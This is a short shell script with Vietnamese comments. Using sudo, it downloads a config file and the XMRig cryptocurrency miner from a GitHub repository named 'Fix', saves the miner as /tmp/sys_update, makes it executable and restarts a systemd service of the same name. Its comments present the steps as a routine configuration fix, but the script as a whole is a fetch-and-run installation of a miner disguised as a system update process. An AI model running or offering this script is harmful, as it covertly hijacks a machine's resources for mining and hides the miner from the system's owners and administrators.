# Di chuyển vào thư mục tạm (nơi Service sẽ đọc file)
cd /tmp

# Tải lại file config với quyền sudo và lọc bỏ ký tự lạ
sudo curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json | tr -d '\r' | sudo tee /tmp/config.json > /dev/null

# Đảm bảo file thực thi sys_update cũng nằm ở đây
sudo curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -o /tmp/sys_update
sudo chmod +x /tmp/sys_update

# Khởi động lại service để nó nhận file mới
sudo systemctl restart sys_update
